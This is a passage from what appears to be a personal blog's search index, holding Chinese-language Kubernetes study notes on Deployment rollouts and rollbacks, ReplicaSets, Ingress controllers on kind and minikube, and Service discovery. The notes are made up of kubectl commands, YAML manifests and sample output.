13m     kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=5984cbd7dd\n# kuard-deployment-6cd695495f   20        20        20      6h38m   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=6cd695495f\n```\n\n~~TODO: 這邊 deployment 程式後，不知道 Service LB 進去會等全部上完好，才會連到新的POD，還是會綜合?~~\n建立 4 個 ReplicaSets 去跑\n`kubectl get endpoints kuard-service --watch -o yaml`\n查看變化，看來**舊新**在跑的時候會同時 LB 舊新(綜合)\n\n\n```bash\n# 暫停部屬\nkubectl rollout pause deployments kuard-deployment\n# 繼續部屬\nkubectl rollout resume deployments kuard-deployment\n\n```\n\n## 查詢歷史狀態\n\n```bash\n# 查看 Deployment 的歷史紀錄\nkubectl rollout history deployment kuard-deployment\n# deployment.apps/kuard-deployment \n# REVISION  CHANGE-CAUSE\n# 7         <none>\n# 8         <none>\n# 9         <none>\n# 12        <none>\n# 13        <none>\n# 查看 Deployment 詳細資訊\nkubectl rollout history deployment kuard-deployment --revision=12\n# deployment.apps/kuard-deployment with revision #12\n# Pod Template:\n#   Labels:       app=kuard\n#         pod-template-hash=bd94b5dbb\n#   Containers:\n#    kuard:\n#     Image:      gcr.io/kuar-demo/kuard-amd64:blue\n#     Port:       8080/TCP\n#     Host Port:  0/TCP\n#     Environment:        <none>\n#     Mounts:     <none>\n#   Volumes:      <none>\n```\n\n## 退回版本\n\n```bash\n# 退回前一個版本\nkubectl rollout undo deployments kuard-deployment\n# deployment.apps/kuard-deployment rolled back\n\n# 查看 replica 數\nkubectl get replicasets -o wide\n# NAME                          DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                               SELECTOR\n# kuard-deployment-5984cbd7dd   0         0         0       22h   kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=5984cbd7dd\n# kuard-deployment-697c6c85     0         0         0       21h   kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=697c6c85\n# kuard-deployment-6cd695495f   0         0         0       29h   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=6cd695495f\n# kuard-deployment-bd94b5dbb    4         4         4       21h   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=bd94b5dbb\n# kuard-deployment-f948c99d9    0         0         0       21h   kuard        gcr.io/kuar-demo/kuard-amd64:1       app=kuard,pod-template-hash=f948c99d9\n\n# 退回某一版 --to-revision\nkubectl rollout undo deployments kuard-deployment --to-revision=11\n\n# 指令上一個版本 => --to-revision=0\nkubectl rollout history deployment kuard-deployment --to-revision=0\n```\n\n> 清理策略\n> \n> 你可以在 Deployment 中設置 .spec.revisionHistoryLimit 字段以指定保留此 Deployment 的多少個舊有 ReplicaSet。其餘的 ReplicaSet 將在後台被> 垃圾回收。 默認情況下，此值為 10。\n> \n> 說明： 顯式將此字段設置為 0 將導致 Deployment 的所有歷史記錄被清空，因此 Deployment 將無法回滾。\n滾動更新 Deployment\n\n\n## Deployment 策略\n\n1. Recreate 策略\n\n會把現有的 ReplicaSet 的 Image 換掉，所有 Pod 都會機高新建置。\n\n2. RollingUpdate\n\n滾動方式不停機情況下更新\n\n## 滾動更新設定\n\n> Deployment 會在 .spec.strategy.type==RollingUpdate時，採取 滾動更新的方式更新 Pods。你可以指定 maxUnavailable 和 maxSurge 來控制滾動更新 過程。\n> 最大不可用\n> \n> .spec.strategy.rollingUpdate.maxUnavailable 是一個可選字段，用來指定 更新過程中不可用的 Pod 的個數上限。該值可以是絕對數字（例如，5），也可以是 所需 Pods 的百分比（例如，10%）。百分比值會轉換成絕對數並去除小數部分。 如果 .spec.strategy.rollingUpdate.maxSurge 為 0，則此值不能為 0。 默認值為 25%。\n> \n> 例如，當此值設置為 30% 時，滾動更新開始時會立即將舊 ReplicaSet 縮容到期望 Pod 個數的70%。 新 Pod 準備就緒後，可以繼續縮容舊有的 ReplicaSet，然後對新的 ReplicaSet 擴容，確保在更新期間 可用的 Pods 總數在任何時候都至少為所需的 Pod 個數的 70%。\n> 最大峰值\n> \n> .spec.strategy.rollingUpdate.maxSurge 是一個可選字段，用來指定可以創建的超出 期望 Pod 個數的 Pod 數量。此值可以是絕對數（例如，5）或所需 Pods 的百分比（例如，10%）。 如果 MaxUnavailable 為 0，則此值不能為 0。百分比值會通過向上取整轉換為絕對數。 此字段的默認值為 25%。\n> \n> 例如，當此值為 30% 時，啟動滾動更新後，會立即對新的 ReplicaSet 擴容，同時保證新舊 Pod 的總數不超過所需 Pod 總數的 130%。一旦舊 Pods 被殺死，新的 ReplicaSet 可以進一步擴容， 同時確保更新期間的任何時候運行中的 Pods 總數最多為所需 Pods 總數的 130%。\n> 進度期限秒數\n> \n> .spec.progressDeadlineSeconds 是一個可選字段，用於指定系統在報告 Deployment 進展失敗 之前等待 Deployment 取得進展的秒數。 這類報告會在資源狀態中體現為 Type=Progressing、Status=False、 Reason=ProgressDeadlineExceeded。Deployment 控制器將持續重試 Deployment。 將來，一旦實現了自動回滾，Deployment 控制器將在探測到這樣的條件時立即回滾 Deployment。\n> \n> 如果指定，則此字段值需要大於 .spec.minReadySeconds 取值。\n> 最短就緒時間\n> .spec.minReadySeconds 是一個可選字段，用於指定新創建的 Pod 在沒有任意容器崩潰情況下的最小就緒時間， 只有超出這個時間 Pod 才被視為可用。默認值為 0（Pod 在準備就緒後立即將被視為可用）。 要瞭解何時 Pod 被視為就緒，可參考容器探針。\n\n我看到最詳細簡單說明\n\n>    minReadySeconds:\n>        容器內應用程式的啟動時間，Kubernetes 會等待設定的時間後才繼續進行升級流程\n>        如果沒有此欄位的話，Kubernetes 會假設該容器一開完後即可進行服務\n>        若未設定此欄位，在某些極端情況下可能會造成服務無法正常運作(新誕生的 pod 尚未進入可服務階段)\n>    maxSurge:\n>        升級過程中最多可以比原先設定所多出的 pod 數量\n>        此欄位可以為固定值或是比例(%)\n>        ex. maxSurge: 1、replicas: 5，代表 Kubernetes 會先開好 1 個新 pod 後才刪掉一個舊的 pod，整個升級過程中最多會有 5+1 個 pod\n>    maxUnavailable:\n>        最多可以有幾個 pod 處在無法服務的狀態\n>        當 maxSurge 不為零時，此欄位亦不可為零\n>        ex. maxUnavailable: 1，代表 Kubernetes 整個升級過程中最多會有 1 個 pod 處在無法服務的狀態\n\n參考:[透過 Kubernetes Deployments 實現滾動升級 | Kubernetes](https://tachingchen.com/tw/blog/kubernetes-rolling-update-with-deployment/)\n\n\n\n[[Kubernetes] Deployment Overview | 小信豬的原始部落](https://godleon.github.io/blog/Kubernetes/k8s-Deployment-Overview/)\n\n## 刪除 Deployment\n\n```bash\nkubectl delete deployments kuard-deployment\n\n```\n\n\n所有的 Pod ,ReplicaSet 都會一起刪除\n\n\n## 感想\n\n上面我測試 Service 更做更新的時候\n不是會有舊新同時運行狀況\n後面書上有提到前端到後端，前端要做好版本前後相容問題\n這樣在切換上才不會發生問題","tags":["deployment"],"categories":["Kubernetes"]},{"title":"Kubernetes 的 ReplicaSet","url":"%2Fblog%2F2021%2F02%2F13%2FKubernetes-%E7%9A%84-ReplicasSet%2F","content":"\n我目前看書上是舊版範例\n所以使用官方[ReplicaSet | Kubernetes](https://kubernetes.io/zh/docs/concepts/workloads/controllers/replicaset/#how-a-replicaset-works)範例\n目前推薦 [[Kubernetes] ReplicaSet 介紹 | 小信豬的原始部落](https://godleon.github.io/blog/Kubernetes/k8s-ReplicaSet-Overview/)\n這邊只是會放操作紀錄，不會很專業解說\n\n<!--more-->\n\n## 前言\n\n一般建立 pod 完可以在建立 service\n我以為 ReplicaSet 也是差不多樣子\n但實作完才發現不一樣...\n建立 ReplicaSet 就會建立 Pod\n\n## 建立有 template 的 ReplicaSet\n\n```yml fronted.yaml\napiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: guestbook\n    tier: frontend\nspec:\n  # modify replicas according to your case\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        tier: frontend\n    spec:\n      containers:\n      - name: php-redis\n        image: gcr.io/google_samples/gb-frontend:v3\n```\n\n```bash\n# 建立 fronted ReplicaSet\nkubectl apply -f https://kubernetes.io/examples/controllers/frontend.yaml\n# replicaset.apps/frontend created\n# 查看狀況\nkubectl get rs\n# NAME       DESIRED   CURRENT   READY   AGE\n# frontend   3         3         3       25s\nkubectl describle rs/fronted\n# Name:         frontend\n# Namespace:    default\n# Selector:     tier=frontend\n# Labels:       app=guestbook\n#               tier=frontend\n# Annotations:  <none>\n# Replicas:     3 current / 3 desired\n# Pods Status:  3 Running / 0 Waiting / 0 Succeeded / 0 Failed\n# Pod Template:\n#   Labels:  tier=frontend\n#   Containers:\n#    php-redis:\n#     Image:        gcr.io/google_samples/gb-frontend:v3\n#     Port:         <none>\n#     Host Port:    <none>\n#     Environment:  <none>\n#     Mounts:       <none>\n#   Volumes:        <none>\n# Events:\n#   Type    Reason            Age   From                   Message\n#   ----    ------            ----  ----                   -------\n#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-bfdqg\n#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-7rlhd\n#   Normal  SuccessfulCreate  53s   replicaset-controller  Created pod: frontend-p54kd\nkubectl get pods \n# NAME             READY   STATUS    RESTARTS   AGE\n# frontend-b2zdv   1/1     Running   0          6m36s\n# frontend-vcmts   1/1     Running   0          6m36s\n# frontend-wtsmm   1/1     Running   0          6m36s\n```\n\n```bash\nkubectl get pods frontend-b2zdv -o yaml\n```\n查看 meta.ownerReferences \n這邊先跳過\n[详解 Kubernetes ReplicaSet 的实现原理 - 面向信仰编程](https://draveness.me/kubernetes-replicaset/)\n\n## 無 template 建立 \n\n```yml pod-rs.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod1\n  labels:\n    tier: frontend\nspec:\n  containers:\n  - name: hello1\n    image: gcr.io/google-samples/hello-app:2.0\n\n---\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\n  labels:\n    tier: frontend\nspec:\n  containers:\n  - name: hello2\n    image: gcr.io/google-samples/hello-app:1.0\n\n```\n\n```bash\nkubectl apply -f https://kubernetes.io/examples/pods/pod-rs.yaml\nkubectl get pods \n# NAME             READY   STATUS        RESTARTS   AGE\n# frontend-7rlhd   1/1     Running       0          10m\n# frontend-bfdqg   1/1     Running       0          10m\n# frontend-p54kd   1/1     Running       0          10m\n# pod1             0/1     Terminating   0          5s\n# pod2             0/1     Terminating   0          5s\n```\n\n這邊會看到，我們建立的 pod 沒有變建立起來\n原因是 ReplicaSet 設定為三，已經建立過了(label 相同)\n\n如果清空，先建立兩個 pod 再 新增 rs\n會友不一樣的結果\n\n```\nNAME             READY   STATUS    RESTARTS   AGE\nfrontend-hmmj2   1/1     Running   0          9s\npod1             1/1     Running   0          36s\npod2             1/1     Running   0          36s\n```\n\n## 擴展 ReplicaSet\n\n### 指令\n\n```bash\nkubectl scale replicasets fronted --replicas=4\n```\n\n指令操作可以直接套用\n但大多數不推薦這個方式\n假如 yaml 重建不會用到\n大多數都從文件調整\n\n## kubectl apply 套用\n\n```bash\nkubectl apply -f xxx.yaml\n```\n\n## 自動擴展\n\n\n```yaml\napiVersion: autoscaling/v1\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: frontend-scaler\nspec:\n  scaleTargetRef:\n    kind: ReplicaSet\n    name: frontend\n  minReplicas: 3\n  maxReplicas: 10\n  targetCPUUtilizationPercentage: 50\n```\n\n```bash\nkubectl apply -f https://k8s.io/examples/controllers/hpa-rs.yaml\n```\n\n或只打指令`kubectl autoscale rs frontend --max=10 --min=3 --cpu-percent=50`\n\n看完這麼多，官方推薦使用 Deployment 來替代 ReplicaSet \n這單元簡單操作並不難\n\n\n## 刪除 ReplicaSet 不刪除 pod\n\n刪除 ReplicaSet 會一起刪除 pod\n要刪除 ReplicaSet 不刪除 pod 情況下要使用\n\n```bash\n# 書上這樣寫，但好像廢棄了\nkubectl delete rs fronted --cascade=false\n# warning: --cascade=false is deprecated (boolean value) and can be replaced with --cascade=orphan.\nkubectl delete rs frontend --cascade=orphan\n# 也能正常運作\n```\n\n[StatefulSet介绍 - taotaozh - 博客园](https://www.cnblogs.com/hsyw/p/14173542.html)\n不知道跟這個有沒有關係\n暫時不研究","tags":["replicasset"],"categories":["Kubernetes"]},{"title":"Kubernetes 使用 Ingress 做負載平衡","url":"%2Fblog%2F2021%2F02%2F11%2FKubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1%2F","content":"\n最近我在學習 Kubernetes，我有問我 K8S 裡面使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server\n我那時後才學到 Service ，Service 是使用 iptable 所以應該無法做到\n我剛看到 Ingress 章節，應該是可以做到我朋友需求\n但仔細想想，探討這個問題也應該沒有意義\n使用 K8S 應該就是使用微服務架構，探討 Server 會不會掛掉或更新， Pod 都一定會重置\n\n搜為網路上看一下， 單獨 Ingress 不是可以做到，需要一個 Ingress Controller 才能做到(這邊這個好像就是 nginx 這種東西)\n不過，Ingress 和 Ingress Controller \n\n> Ingress 本身並沒有提供負載平衡的功能，還需要透過 Ingress Controller 來實現。Ingress Controller 目前主要支援兩種型別 GCE 與 Nginx，而今天我們將透過 Nginx Ingress Controller 在 Kubernetes Cluster 內部架設 load balancer。\n\n來源: [[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10196261)\n\n**2021-02-04**\n我找到我朋友說的`使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server`\n專有述語叫做 `Sticky Session`\nNginx Ingress Controller 可以做到\n- [Sticky Sessions - NGINX Ingress Controller](https://kubernetes.github.io/ingress-nginx/examples/affinity/cookie/)\n- [Services - Traefik](https://doc.traefik.io/traefik/routing/services/#sticky-sessions)\n- [Ingress session sticky_总结、分享、交流-CSDN博客](https://blog.csdn.net/linuxerlin/article/details/107561912)\n結論還是能做到的\n\n<!--more-->\n\n## 前言\n\n之前有碰過 traefik ，在使用 docker 情況下 ，traefik 是使用 docker label 去抓設定\n我原本以為 K8s 應該也差不多\n後來看到 Ingress 跟 Ingress Controller 一直在想這件事情\n突然想到 Ingress 應該就控制網站Virtual Server(不確定是不是這樣叫) 設定\nIngress Controller 可能是 Apache , nginx (類似這些東西做反向代理)\n這樣換不同 Ingress Controller 也不用重新設定\n應該是這樣定位吧(我自己想的)\n\n教學還是建議看 [[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10196261)\n我這邊還是以操作紀錄為主\n\nKind 由於先前發現做 NodePort 會有問題，這邊用 minikube 可能比較不會出狀況\n當然官方也是有方法可以避免\n可以看一下官方操作方法[kind – Ingress](https://kind.sigs.k8s.io/docs/user/ingress/)\n主要是 expose port\n\n## Kind 官方設定教學\n\n### 對應環境設定 (Kind)\n\n```bash\nkind delete cluster # 確定刪除\nkubectl config get-context # 確定使用的 k8s 連結設定\ncat <<EOF | kind create cluster --config=-\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: InitConfiguration\n    nodeRegistration:\n      kubeletExtraArgs:\n        node-labels: \"ingress-ready=true\"\n  extraPortMappings:\n  - containerPort: 80\n    hostPort: 80\n    protocol: TCP\n  - containerPort: 443\n    hostPort: 443\n    protocol: TCP\nEOF\n```\n\n### 安裝 Contour (Ingress Controller)\n\n```bash\nkubectl apply -f https://projectcontour.io/quickstart/contour.yaml\n# namespace/projectcontour created\n# serviceaccount/contour created\n# serviceaccount/envoy created\n# configmap/contour created\n# customresourcedefinition.apiextensions.k8s.io/extensionservices.projectcontour.io created\n# customresourcedefinition.apiextensions.k8s.io/httpproxies.projectcontour.io created\n# customresourcedefinition.apiextensions.k8s.io/tlscertificatedelegations.projectcontour.io created\n# serviceaccount/contour-certgen created\n# rolebinding.rbac.authorization.k8s.io/contour created\n# role.rbac.authorization.k8s.io/contour-certgen created\n# job.batch/contour-certgen-v1.12.0 created\n# clusterrolebinding.rbac.authorization.k8s.io/contour created\n# clusterrole.rbac.authorization.k8s.io/contour created\n# service/contour created\n# service/envoy created\n# deployment.apps/contour created\n# daemonset.apps/envoy created\n```\n\n### 設定 daemonsets  \n\n```json\n{\n  \"spec\": {\n    \"template\": {\n      \"spec\": {\n        \"nodeSelector\": {\n          \"ingress-ready\": \"true\"\n        },\n        \"tolerations\": [\n        {\n          \"key\": \"node-role.kubernetes.io/master\",\n          \"operator\": \"Equal\",\n          \"effect\": \"NoSchedule\"\n        }\n        ]\n      }\n    }\n  }\n}\n\n```\n\n```bash\nkubectl patch daemonsets -n projectcontour envoy -p '{\"spec\":{\"template\":{\"spec\":{\"nodeSelector\":{\"ingress-ready\":\"true\"},\"tolerations\":[{\"key\":\"node-role.kubernetes.io/master\",\"operator\":\"Equal\",\"effect\":\"NoSchedule\"}]}}}}'\n```\n\n先設定，之後代研究這個是做什麼用\n但我發現這個沒設定好像也能跑 = =a\n\n### 使用 Ingress \n\n預設好像就有這個，所以不需要特別裝\n\n```yml \nkind: Pod\napiVersion: v1\nmetadata:\n  name: foo-app\n  labels:\n    app: foo\nspec:\n  containers:\n  - name: foo-app\n    image: hashicorp/http-echo:0.2.3\n    args:\n    - \"-text=foo\"\n---\nkind: Service\napiVersion: v1\nmetadata:\n  name: foo-service\nspec:\n  selector:\n    app: foo\n  ports:\n  # Default port used by the image\n  - port: 5678\n---\nkind: Pod\napiVersion: v1\nmetadata:\n  name: bar-app\n  labels:\n    app: bar\nspec:\n  containers:\n  - name: bar-app\n    image: hashicorp/http-echo:0.2.3\n    args:\n    - \"-text=bar\"\n---\nkind: Service\napiVersion: v1\nmetadata:\n  name: bar-service\nspec:\n  selector:\n    app: bar\n  ports:\n  # Default port used by the image\n  - port: 5678\n---\napiVersion: networking.k8s.io/v1beta1\nkind: Ingress\nmetadata:\n  name: example-ingress\nspec:\n  rules:\n  - http:\n      paths:\n      - path: /foo\n        backend:\n          serviceName: foo-service\n          servicePort: 5678\n      - path: /bar\n        backend:\n          serviceName: bar-service\n          servicePort: 5678\n---\n```\n\n上面建立兩個pod,service，然後新增 Ingress 設定\n\n```bash\nkubectl apply -f https://kind.sigs.k8s.io/examples/ingress/usage.yaml\n```\n\n### 執行內容\n\n```bash\n# should output \"foo\"\ncurl localhost/foo\n# should output \"bar\"\ncurl localhost/bar\n```\n\n### 查看 Ingress 指令\n\n```bash\nkubectl get ingress\nkubectl describle ingress simple-ingress\n```\n\n### kubernetes之ingress error: endpoints \"default-http-backend\" not found \n\n```\n翻譯：\n控制器。注意:根據您正在使用的Ingress控制器，您可能需要創建一個default-http-backend服務。\n違約後端\n沒有規則的入口將所有流量發送到一個默認後端。默認後端通常是Ingress控制器的一個配置選項，在您的Ingress資源中沒有指定。\n如果Ingress對象中的主機或路徑都不匹配HTTP請求，則流量將被路由到默認後端。\n```\n\n參考:[kubernetes之ingress error: endpoints \"default-http-backend\" not found - Mr.zou - 博客园](https://www.cnblogs.com/zoulixiang/p/13554893.html)\n\n\n## 使用 host 名稱對應 service\n\n由於書中跟 [[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10196261)\n為了加速實作，這邊使用上面範例\n\n### 使用 minikube\n\n```bash\n# 啟用 minikube 的 ingress\nminikube addons enable ingress\n# 取得 minikube ip\nminikube ip\n```\n\n### service ,pod , ingress 設定\n\n```bash\n# 建立測試 pod\nkubectl create -f  https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-pod.yaml\n```\n\n事後想想這邊可以用上面範例 echo 出不同字串\n這樣就可以知道用到哪一個 pod\n\n\n建立兩個測試用 serivce 都倒同一個 service\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: helloworld-v1\nspec:\n  ports:\n  - port: 3000\n    protocol: TCP\n    targetPort: 3000\n  selector:\n    app: helloworld-pod\n```\n\n```yml\napiVersion: v1\nkind: Service\nmetadata:\n  name: helloworld-v2\nspec:\n  ports:\n  - port: 3000\n    protocol: TCP\n    targetPort: 3000\n  selector:\n    app: helloworld-pod\n```\n\n```bash\nkubectl create -f https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-service.yaml\nkubectl get svc\n# Name:              helloworld-v1\n# Namespace:         default\n# Labels:            <none>\n# Annotations:       <none>\n# Selector:          app=helloworld-pod\n# Type:              ClusterIP\n# IP Families:       <none>\n# IP:                10.96.172.11\n# IPs:               <none>\n# Port:              <unset>  3000/TCP\n# TargetPort:        3000/TCP\n# Endpoints:         172.17.0.7:3000\n# Session Affinity:  None\n# Events:            <none>\n\n\n# Name:              helloworld-v2\n# Namespace:         default\n# Labels:            <none>\n# Annotations:       <none>\n# Selector:          app=helloworld-pod\n# Type:              ClusterIP\n# IP Families:       <none>\n# IP:                10.96.251.221\n# IPs:               <none>\n# Port:              <unset>  3000/TCP\n# TargetPort:        3000/TCP\n# Endpoints:         172.17.0.7:3000\n# Session Affinity:  None\n# Events:            <none>\n```\n\n確認是否成功\n\n```bash\n# 進去 node 確認狀況\nminikube ssh\n# 確認 pods 可以正常連到\ncurl 10.96.172.11:3000\n```\n\n繼續建立 ingress controller\n\n```bash\n# 官方安裝 nginx ingress controller\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.44.0/deploy/static/provider/baremetal/deploy.yaml\n# 原作yaml 無法建立\n# error: error validating \"https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/nginx-ingress.yaml\": error validating data: [ValidationError(Ingress.metadata): unknown field \"kubernetes.io/ingress.class\" in io.k8s.apimachinery.pkg.apis.meta.v1.ObjectMeta, ValidationError(Ingress.spec.rules[0]): unknown field \"paths\" in io.k8s.api.extensions.v1beta1.IngressRule]; if you choose to ignore these errors, turn validation off with --validate=false\nvim nginx-ingress.yaml \n```\n參考 [k8s-30-day-sharing/ingress-example-2.yaml at master · zxcvbnius/k8s-30-day-sharing](https://github.com/zxcvbnius/k8s-30-day-sharing/blob/master/Day19/demo-ingress/ingress-example-2.yaml)\n裡面 service name 有錯誤，建議使用下面複製\n```yml\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: example-2\nspec:\n  rules:\n  - host: helloworld-v1.example.com\n    http:\n      paths:\n      - path: /\n        backend: \n          serviceName: helloworld-v1\n          servicePort: 80\n  - host: helloworld-v2.example.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: helloworld-v2\n          servicePort: 80\n```\n\n### 測試 host 方法\n\n1. curl -H\n之前[在 Raspberry PI 架設 Traefik 初體驗 | 程式狂想筆記](https://malagege.github.io/blog/2020/10/13/%E5%9C%A8-Raspberry-PI-%E6%9E%B6%E8%A8%AD-Traefik-%E5%88%9D%E9%AB%94%E9%A9%97/#%E6%B8%AC%E8%A9%A6%E6%96%B9%E6%B3%95)這篇有紀錄\n通常改 /etc/hosts 檔案或者curl 指令可以做到(這當初看到 traefik 官方文件寫的，還滿神奇的，畢竟很多教學沒這樣教)\n\n\n2. /etc/hosts\n\n```bash\n# 這個 IP 是 node IP\ncurl -H Host:helloworld-v1.example.com http://192.168.99.102/  \ncurl -H Host:helloworld-v2.example.com http://192.168.99.102/  \n```\n\n\n## SSL termination(代理端做 tls)\n\ningress-ssl-sceret.yaml\n```yaml ingress-ssl-sceret.yaml\napiVersion: v1\ndata:\n  tls.crt: YmFzZTY0X2VuY29kZWRfY2VydA==\n  tls.key: YmFzZTY0X2VuY29kZWRfa2V5\nkind: Secret\nmetadata:\n  name: ssh-secret\n  namespace: default\ntype: Opaque\n```\n\nexample3-ingress.yaml\n```yaml\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: example-3\nspec:\n  tls:\n  - secretName: ssh-secret\n  backend:\n    serviceName: helloworld-v1\n    servicePort: 3000\n```\n\n\n## 運行多個 Ingress Controller\n\n一個叢集中運行多個Ingress 控制器，可以搭配 Annotation 的 `kubernetes.io/ingress.class`\n如果沒有配置 `kubernetes.io/ingress.class`，會有多個不同Ingress Controller 搶 Ingress 使用權，並寫入Ingress 件的status 欄位\n\n\n\n後面兩個就不先仔細研究\n\n## wildcard host\n\n[Ingress | Kubernetes](https://kubernetes.io/docs/concepts/services-networking/ingress/#hostname-wildcards)\n\n## rewrite url\n\n[ingress-nginx 中 Rewrite 的使用-阳明的博客|Kubernetes|Istio|Prometheus|Python|Golang|云原生](https://www.qikqiak.com/post/url-rewrite-on-ingress-nginx/)\n\n\n## 感想\n\n之前有操作 Traefik 使用 Docker Label 讓 Traefik 可以自動抓到想要的 host \n使用 Ingress 來看，這個設計能做到模組化分離，可算非常棒!!\n\n以後有用到 Traefik  Ingress 再回來填坑","tags":["ingress"],"categories":["Kubernetes"]},{"title":"Kubernetes 服務探索(Service Discovery)","url":"%2Fblog%2F2021%2F02%2F04%2FKubernetes-%E6%9C%8D%E5%8B%99%E6%8E%A2%E7%B4%A2-Service-Discovery%2F","content":"\nKubernetes  Service 筆記\n\n<!--more-->\n\n```bash\nkubectl run alpaca-prod \\\n--image=gcr.io/kuar-demo/kuard-amd64:blue \\\n--port=8000 \\\n--labels=\"ver=1,app=alpaca,env=prod\"\n\n# 用 expose 創建一個 service\nkubectl expose pod alpaca-prod\n\n# 這邊很有趣，看 kubectl describe svc alpaca-prod\n# 裡面\n# spec:\n#   clusterIP: 10.96.29.232\n#   ports:\n#   - port: 8000\n#     protocol: TCP\n#     targetPort: 8000\n#   selector:\n#     app: alpaca\n#     env: prod\n#     ver: \"1\"\n#是用 selector 對印\n\nkubectl get services -o wide\n\n```\n\n```bash\n# 現在 kubectl run 產生 pod ，所以應該可以不用這段\n# 這段是書寫的，之後改成 deployment 再嘗試\nALPACA_POD=$(kubectl get pods -l app=alpaca \\\n-o jsonpath='{.items[0].metadata.name}')\n\n# $ALPACA_POD => alapaca-pod\nkubectl port-forward $ALPACA_POD 48858:8080\n\n# 執行完成可以用 localhost:48858 看到頁面\n```\n\n\n\n## Cluster IP\n\nCluster IP 是虛擬 IP，通常會指定一個 DNS，通常 IP 不會更動，這樣就不會有 DNS 快取問題。\n在 namespace ，我們只需要用 service 名稱連結 pod\n\n### Service DNS\n\n用剛剛`kubectl port-forward $ALPACA_POD 48858:8080` \n進去`http://localhost:48858/`裡面的`DNS QUERY`\nname 輸入 `alpaca-prod`就可以找到\n\n[Debugging DNS Resolution | Kubernetes](https://kubernetes.io/docs/tasks/administer-cluster/dns-debugging-resolution/)\n\nalpaca-prod.default.svc.cluster.local\n\n這邊可以看到 `alpaca-prod`後面 `default` 是 namespace\n可以在 dns 搜尋 alpaca-prod.default 查詢到東西\n完整的`alpaca-prod.default.svc.cluster.local`\n也可以查詢到\n\n```\n;; opcode: QUERY, status: NOERROR, id: 22467\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;alpaca-prod.default.svc.cluster.local.\tIN\t A\n\n;; ANSWER SECTION:\nalpaca-prod.default.svc.cluster.local.\t30\tIN\tA\t10.99.141.81\n```\n\n\n### Readiness Prob\n\n```\nkubectl  edit deployment/alpaca-prod\n```\n由於這邊使用 pod 會有`Forbidden: pod updates may not change fields other than`\n> Kubernetes 對 Pod 的更新做了限制，除了更改 Pod 中容器（包括工作容器與初始化容器）的鏡像，以及 activeDeadlineSeconds （對 Job 類型的 Pod 定義失敗重試的最大時間）， tolerations （Pod 對污點的容忍），修改其它部分將不會產生作用，如我們可以嘗試在前面 Pod 定義文檔 pod-test.yaml 中將宿主機端口 8081 改為 8082，重新執行 kubectl apply， 將提示如下錯誤，\n\n參考:[Kubernetes筆記（五）：瞭解Pod（容器組） - 知乎](https://zhuanlan.zhihu.com/p/234793180)\n\n```yaml\n...\n    livenessProbe:\n      httpGet:\n        path: /\n        port: 80\n        httpHeaders: # 此處header無意義，僅作示例\n        - name: purpose\n          value: for-test\n      initialDelaySeconds: 2\n      periodSeconds: 5\n```\n這邊就先不仔細研究\n\n\n### 用 endpoints 觀察\n使用 endpint 是尋找 service 將流量發送到何處地方\n\n```\nkubectl get endpoints alpaca-prod --watch\n```\n\n\n## NodePort\n\n```\nkubectl edit service alpaca-prod\n```\n\nTYPE 改成 NodeType\n這個就跟 docker 設定 port 對外很像\n\n```\nName:                     alpaca-prod\nNamespace:                default\nLabels:                   app=alpaca\n                          env=prod\n                          ver=1\nAnnotations:              <none>\nSelector:                 app=alpaca,env=prod,ver=1\nType:                     NodePort\nIP Families:              <none>\nIP:                       10.99.141.81\nIPs:                      <none>\nPort:                     <unset>  8000/TCP\nTargetPort:               8000/TCP\nNodePort:                 <unset>  30306/TCP\nEndpoints:                10.244.0.6:8000\nSession Affinity:         None\nExternal Traffic Policy:  Cluster\nEvents:                   <none>\n```\n\n這邊注意，由於我們使用 Kind 做測試\n使用 nodePort 發現怎麼連不到\n後來我注意到 node ，不應該是指操作 kubectl 主機上 面\n\n```\nkubectl get node -o wide\n```\n\n但是對 node 主機上 port 還是連不到\n\n```\nssh <ndoe_ip> -L 8080:localhost:30306\n```\n\n不過看來 kind 不支源使用 nodeport\n- [docker - How to use NodePort with kind? - Stack Overflow](https://stackoverflow.com/questions/62432961/how-to-use-nodeport-with-kind)\n- [nginx 